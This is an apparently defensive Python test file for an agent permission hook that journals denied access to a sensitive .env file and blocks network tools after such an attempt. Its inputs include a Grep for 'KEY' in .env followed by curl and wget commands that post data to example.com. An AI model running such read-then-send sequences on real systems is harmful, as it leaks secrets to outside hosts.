"""ADR 0028 slice 1c: deny-only denies and pre-gate denies leave a journal entry; a run that tried to reach a
sensitive path cannot WebFetch or run curl/wget-shaped Bash afterwards (trifecta leg 3), path/tool only.
"""
import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
HOOK = ROOT / "hooks/adf-read-hook.py"
sys.path.insert(0, str(ROOT))
from integration.adapter_attempt import verify_attempt  # noqa: E402
from integration.local_read_adapter import schemas  # noqa: E402


def git(cwd, *args): return subprocess.run(["git", "-C", str(cwd), *args], check=True, capture_output=True, text=True).stdout


class DenyGateJournalTest(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory(); self.addCleanup(self.temp.cleanup)
        base = Path(self.temp.name).resolve()
        self.user_home, self.repo = base / "home", base / "proj"; self.home = self.user_home / ".adf"
        self.home.mkdir(parents=True); (self.repo / "config").mkdir(parents=True); (self.repo / "config/.env").touch(); (self.repo / "README.md").write_text("public")
        git(self.repo, "init", "-q"); git(self.repo, "config", "user.email", "m@example.invalid"); git(self.repo, "config", "user.name", "m"); git(self.repo, "add", "-f", "."); git(self.repo, "commit", "-qm", "f")
        (self.home / "enabled-projects").write_text(f"{self.repo}\n")
        self.schema = schemas()["adapter_attempt_event"]

    def run_hook(self, tool, tool_input, session="sess-1c", agent_type=None):
        payload = {"hook_event_name": "PreToolUse", "tool_name": tool, "session_id": session, "tool_input": tool_input, **({"agent_type": agent_type} if agent_type else {})}
        env = {"PATH": os.environ["PATH"], "HOME": str(self.user_home), "ADF_HOME": str(self.home), "CLAUDE_PROJECT_DIR": str(self.repo)}
        result = subprocess.run([sys.executable, str(HOOK)], input=json.dumps(payload), capture_output=True, text=True, env=env, timeout=120)
        self.assertEqual((result.returncode, result.stderr), (0, ""))
        if not result.stdout.strip(): return None
        out = json.loads(result.stdout)
        return out["hookSpecificOutput"]["permissionDecisionReason"] if "hookSpecificOutput" in out else out

    def journals(self):
        out = []
        for path in sorted((self.home / "evidence").rglob("_attempts/*.jsonl")) if (self.home / "evidence").exists() else []:
            events = [json.loads(line) for line in path.read_text().splitlines()]
            self.assertEqual(verify_attempt(events, self.schema), "complete", path.name)
            out.append(events)
        return out

    def path(self, rel): return str(self.repo / rel)

    def test_a_deny_only_decision_is_journaled_and_verifies_offline(self):
        self.assertIn("uncovered_write_denied_sensitive", self.run_hook("Edit", {"file_path": self.path("config/.env"), "old_string": "a", "new_string": "b"}, agent_type="worker"))
        (start, end), = self.journals()
        self.assertEqual((start["adapter_id"], start["run_id"], start["payload"]), ("deny-only-gate", "sess-1c", {"principal_sub": "claude:worker", "act_depth": 1}))  # ADR 0033: a subagent acts for main (depth 1)
        self.assertEqual(end["payload"], {"outcome": "deny", "reason_code": "uncovered_write_denied_sensitive", "bundle_id": None, "cleanup_outcome": "not_attempted"})
        self.assertFalse(any(p.suffix == ".json" for p in (self.home / "evidence").rglob("*") if "_attempts" not in p.parts), "still no bundle: nothing was admitted")
        self.assertNotIn("config/.env", json.dumps([start, end]), "the journal never carries the path")

    def test_pass_through_leaves_no_journal(self):
        self.assertIsNone(self.run_hook("Edit", {"file_path": self.path("README.md"), "old_string": "a", "new_string": "b"}))
        self.assertIsNone(self.run_hook("WebFetch", {"url": "https://example.com"}), "clean run: network tools are not ADF's call")
        self.assertEqual(self.journals(), [])

    def test_control_plane_tampered_is_journaled(self):
        env = {**os.environ, "HOME": str(self.user_home), "ADF_HOME": str(self.home)}
        subprocess.run([sys.executable, "-c", "import sys; sys.path.insert(0, sys.argv[1]); from integration.cli import main; raise SystemExit(main(['doctor', '--pin']))", str(ROOT)], check=True, capture_output=True, env=env)
        (self.home / "enabled-projects").write_text(f"{self.repo}\n/tmp/x\n")
        self.assertIn("control_plane_tampered", self.run_hook("Read", {"file_path": self.path("README.md")}))
        (_, end), = self.journals(); self.assertEqual(end["payload"]["reason_code"], "control_plane_tampered")

    def test_network_after_a_sensitive_attempt_in_the_same_run_is_denied(self):
        self.assertIn("uncovered_read_denied_sensitive", self.run_hook("Grep", {"pattern": "KEY", "path": self.path("config/.env")}))
        self.assertIn("uncovered_network_denied_after_sensitive_read", self.run_hook("WebFetch", {"url": "https://example.com/?q=1"}))
        self.assertIn("uncovered_network_denied_after_sensitive_read", self.run_hook("Bash", {"command": "curl -s https://example.com -d @x"}))
        self.assertIn("uncovered_network_denied_after_sensitive_read", self.run_hook("Bash", {"command": "echo hi | wget -qO- https://example.com --post-data=x"}))
        self.assertEqual(self.run_hook("Bash", {"command": "ls -la"}), {}, "non-network Bash still follows the existing gate contract")
        self.assertIsNone(self.run_hook("WebFetch", {"url": "https://example.com"}, session="sess-other"), "another run is clean")
        reasons = [end["payload"]["reason_code"] for _, end in self.journals()]
        self.assertEqual(reasons.count("uncovered_network_denied_after_sensitive_read"), 3)

    def test_sensitive_path_denied_by_the_read_gate_also_taints_the_run(self):
        self.assertIn("invalid_scope", self.run_hook("Read", {"file_path": self.path("config/.env")}), "the Read gate denies .env in the PDP")
        self.assertIn("uncovered_network_denied_after_sensitive_read", self.run_hook("WebFetch", {"url": "https://example.com"}))

    def test_project_reasons_counts_the_new_codes(self):
        self.run_hook("Edit", {"file_path": self.path("config/.env"), "old_string": "a", "new_string": "b"})
        proc = subprocess.run([sys.executable, str(ROOT / "hooks/adf-projects.py"), "reasons"], capture_output=True, text=True, env={**os.environ, "HOME": str(self.user_home), "ADF_HOME": str(self.home)})
        self.assertEqual(proc.returncode, 0, proc.stderr); self.assertIn("uncovered_write_denied_sensitive=1", proc.stdout)


if __name__ == "__main__": unittest.main(verbosity=2)
